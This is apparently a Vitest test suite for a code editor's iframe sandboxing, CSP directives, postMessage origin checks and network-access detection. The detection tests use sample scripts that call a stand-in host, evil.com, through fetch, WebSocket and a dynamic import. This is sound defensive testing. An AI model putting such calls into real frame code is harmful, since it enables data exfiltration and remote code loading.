// Frame Isolation Test Suite — Slice E1 (Frame Security Hardening)
// Verifies CSP, sandbox attributes, postMessage origin checks, and
// network access pattern detection in the code editor.

import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import { buildSrcdoc } from '../hooks/useFrameRenderer';
import { validateFrameCode } from '../components/studio/CodeEditor';
import { FrameRenderer } from '../components/studio/FrameRenderer';
import React from 'react';

// ── CSP Meta Tag ──

describe('Frame Security Hardening (E1)', () => {
  describe('CSP Meta Tag', () => {
    const srcdoc = buildSrcdoc('<kcl-slide></kcl-slide>', '1.0.0');

    it('includes Content-Security-Policy meta tag in srcdoc', () => {
      expect(srcdoc).toContain('<meta http-equiv="Content-Security-Policy"');
    });

    it('includes connect-src none directive', () => {
      expect(srcdoc).toContain("connect-src 'none'");
    });

    it('includes form-action none directive', () => {
      expect(srcdoc).toContain("form-action 'none'");
    });

    it('includes frame-src none directive', () => {
      expect(srcdoc).toContain("frame-src 'none'");
    });

    it('includes script-src with unsafe-inline and origin', () => {
      // In test env, origin is '' (no window.location.origin)
      expect(srcdoc).toContain("script-src 'unsafe-inline'");
    });

    it('includes style-src with unsafe-inline and origin', () => {
      expect(srcdoc).toContain("style-src 'unsafe-inline'");
    });

    it('includes img-src allowing blob: and data:', () => {
      expect(srcdoc).toContain('img-src blob: data:');
    });
  });

  // ── PostMessage Origin ──

  describe('postMessage Origin', () => {
    it('uses parent origin instead of wildcard in error handler', () => {
      const srcdoc = buildSrcdoc('<kcl-slide></kcl-slide>', '1.0.0');
      // Count occurrences of postMessage with '*' — only edit mode init should use '*'
      const wildcardMatches = srcdoc.match(/postMessage\([^)]+,\s*'\*'\)/g) || [];
      // The edit-mode init posts to same window, so '*' is acceptable there.
      // All parent.postMessage calls should NOT use '*'.
      const parentWildcardMatches = srcdoc.match(/parent\.postMessage\([^)]+,\s*'\*'\)/g) || [];
      expect(parentWildcardMatches).toHaveLength(0);
    });

    it('edit mode init uses same-window postMessage (wildcard acceptable)', () => {
      const srcdoc = buildSrcdoc('<kcl-slide></kcl-slide>', '1.0.0', true);
      // window.postMessage (not parent) with '*' is fine for same-window
      expect(srcdoc).toContain("window.postMessage({ type: 'kcl:init-edit-mode' }, '*')");
    });
  });

  // ── Sandbox Attributes ──

  describe('Sandbox Attributes', () => {
    it('iframe has sandbox="allow-scripts"', () => {
      const ref = React.createRef<HTMLIFrameElement>();
      const { container } = render(
        <FrameRenderer
          srcdoc="<html></html>"
          renderError={null}
          isLoading={false}
          iframeRef={ref}
          onClearError={() => {}}
        />
      );
      const iframe = container.querySelector('iframe');
      expect(iframe).not.toBeNull();
      expect(iframe!.getAttribute('sandbox')).toBe('allow-scripts');
    });

    it('iframe does not have allow-same-origin', () => {
      const ref = React.createRef<HTMLIFrameElement>();
      const { container } = render(
        <FrameRenderer
          srcdoc="<html></html>"
          renderError={null}
          isLoading={false}
          iframeRef={ref}
          onClearError={() => {}}
        />
      );
      const iframe = container.querySelector('iframe');
      const sandbox = iframe!.getAttribute('sandbox') || '';
      expect(sandbox).not.toContain('allow-same-origin');
    });

    it('iframe does not have allow-forms', () => {
      const ref = React.createRef<HTMLIFrameElement>();
      const { container } = render(
        <FrameRenderer
          srcdoc="<html></html>"
          renderError={null}
          isLoading={false}
          iframeRef={ref}
          onClearError={() => {}}
        />
      );
      const iframe = container.querySelector('iframe');
      const sandbox = iframe!.getAttribute('sandbox') || '';
      expect(sandbox).not.toContain('allow-forms');
    });

    it('iframe does not have allow-popups', () => {
      const ref = React.createRef<HTMLIFrameElement>();
      const { container } = render(
        <FrameRenderer
          srcdoc="<html></html>"
          renderError={null}
          isLoading={false}
          iframeRef={ref}
          onClearError={() => {}}
        />
      );
      const iframe = container.querySelector('iframe');
      const sandbox = iframe!.getAttribute('sandbox') || '';
      expect(sandbox).not.toContain('allow-popups');
    });
  });

  // ── Network Access Detection (Code Editor Validation) ──

  describe('Network Access Detection (Code Editor)', () => {
    it('warns on fetch() usage', () => {
      const errors = validateFrameCode('<script>fetch("https://evil.com")</script>');
      const networkWarnings = errors.filter(e => e.message.includes('fetch()'));
      expect(networkWarnings.length).toBeGreaterThan(0);
      expect(networkWarnings[0].severity).toBe('warning');
    });

    it('warns on XMLHttpRequest usage', () => {
      const errors = validateFrameCode('<script>const xhr = new XMLHttpRequest();</script>');
      const networkWarnings = errors.filter(e => e.message.includes('XMLHttpRequest'));
      expect(networkWarnings.length).toBeGreaterThan(0);
      expect(networkWarnings[0].severity).toBe('warning');
    });

    it('warns on WebSocket usage', () => {
      const errors = validateFrameCode('<script>const ws = new WebSocket("wss://evil.com");</script>');
      const networkWarnings = errors.filter(e => e.message.includes('WebSocket'));
      expect(networkWarnings.length).toBeGreaterThan(0);
      expect(networkWarnings[0].severity).toBe('warning');
    });

    it('warns on navigator.sendBeacon usage', () => {
      const errors = validateFrameCode('<script>navigator.sendBeacon("/log", data);</script>');
      const networkWarnings = errors.filter(e => e.message.includes('sendBeacon'));
      expect(networkWarnings.length).toBeGreaterThan(0);
      expect(networkWarnings[0].severity).toBe('warning');
    });

    it('warns on EventSource usage', () => {
      const errors = validateFrameCode('<script>const es = new EventSource("/events");</script>');
      const networkWarnings = errors.filter(e => e.message.includes('EventSource'));
      expect(networkWarnings.length).toBeGreaterThan(0);
      expect(networkWarnings[0].severity).toBe('warning');
    });

    it('warns on dynamic import() usage', () => {
      const errors = validateFrameCode('<script>import("https://evil.com/module.js")</script>');
      const networkWarnings = errors.filter(e => e.message.includes('import()'));
      expect(networkWarnings.length).toBeGreaterThan(0);
      expect(networkWarnings[0].severity).toBe('warning');
    });

    it('does not false-positive on "prefetch" or variable names containing "fetch"', () => {
      const errors = validateFrameCode(
        '<kcl-slide>\n' +
        '<kcl-text>prefetch data</kcl-text>\n' +
        '<script>const fetchData = "hello";</script>\n' +
        '</kcl-slide>'
      );
      const networkWarnings = errors.filter(e => e.message.includes('Network access'));
      expect(networkWarnings).toHaveLength(0);
    });

    it('does not false-positive on fetch in comments', () => {
      const errors = validateFrameCode(
        '<kcl-slide>\n' +
        '<!-- We used to fetch data here but now we use postMessage -->\n' +
        '</kcl-slide>'
      );
      // "fetch" in a comment without parenthesis should not trigger
      const networkWarnings = errors.filter(e => e.message.includes('fetch()'));
      expect(networkWarnings).toHaveLength(0);
    });
  });

  // ── CSP Violation Reporting ──

  describe('CSP Violation Reporting', () => {
    it('srcdoc includes securitypolicyviolation listener', () => {
      const srcdoc = buildSrcdoc('<kcl-slide></kcl-slide>', '1.0.0');
      expect(srcdoc).toContain('securitypolicyviolation');
      expect(srcdoc).toContain("type: 'kcl:csp-violation'");
    });
  });
});
